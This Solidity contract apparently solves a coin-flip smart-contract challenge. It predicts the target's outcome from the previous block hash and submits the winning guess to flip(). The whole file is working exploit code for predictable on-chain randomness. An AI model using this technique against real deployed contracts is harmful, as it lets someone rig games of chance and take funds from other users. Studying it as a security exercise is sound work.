// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract GuessCoinFlip {
    ICoinFlip public coinFlip;
    address public coinflipAddress;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(address _coinFlipAddress) {
        coinflipAddress = _coinFlipAddress;
        coinFlip = ICoinFlip(coinflipAddress);
    }

    function getCoinFlip() public {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipFactor = blockValue / FACTOR;
        bool side = coinFlipFactor == 1 ? true : false;

        coinFlip.flip(side);
    }
    
}